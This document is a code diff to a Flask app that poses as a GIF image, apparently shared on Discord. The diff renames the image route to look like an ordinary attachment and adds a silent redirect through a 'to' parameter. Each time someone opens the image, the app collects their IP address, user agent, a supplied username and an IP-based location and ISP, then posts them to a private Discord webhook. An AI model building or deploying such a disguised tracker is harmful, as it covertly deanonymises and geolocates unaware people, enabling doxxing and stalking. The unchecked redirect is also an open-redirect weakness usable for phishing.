@@ -1,4 +1,4 @@
-from flask import Flask, request, send_file
+from flask import Flask, request, send_file, redirect
 import requests
 import os
 
@@ -20,25 +20,19 @@ def get_location(ip):
     except:
         return "Unknown", "Unknown", "Unknown"
 
-@app.route('/tenor.gif')
+@app.route('/image0.gif')
 def track():
-    # Get real IP (behind proxy)
+    # Get real IP
     forwarded = request.headers.get('X-Forwarded-For')
     ip = forwarded.split(',')[0] if forwarded else request.remote_addr
-
-    # Get username from ?user=
     user = request.args.get('user', 'Unknown')
-
-    # Get device
     ua = request.headers.get('User-Agent', 'Unknown')[:100]
-
-    # Get location
     location, coords, isp = get_location(ip)
 
-    # Send to Discord
+    # Log to private #cag-logs
     if WEBHOOK_URL:
         payload = {
-            "content": f"**GIF Clicked**\n"
+            "content": f"**GIF Clicked & Redirected**\n"
                        f"**User:** `{user}`\n"
                        f"**IP:** `{ip}`\n"
                        f"**Location:** {location}\n"
@@ -49,15 +43,19 @@ def track():
         try:
             requests.post(WEBHOOK_URL, json=payload)
         except:
-            pass  # Silent fail
+            pass
 
-    # Show the GIF (must be named tenor.gif in repo)
-    return send_file('tenor.gif', mimetype='image/gif')
+    # Get redirect URL from ?to=
+    redirect_url = request.args.get('to', 'https://discord.gg/yourserver')
+    
+    # Show GIF + redirect
+    response = send_file('image0.gif', mimetype='image/gif')
+    response.headers['Refresh'] = f'0; url={redirect_url}'
+    return response
 
-# Optional: redirect root
 @app.route('/')
 def home():
-    return "Tracker is live. Send /tenor.gif"
+    return "Tracker live. Use /image0.gif?user=Name&to=https://example.com"
 
 if __name__ == '__main__':
     app.run()
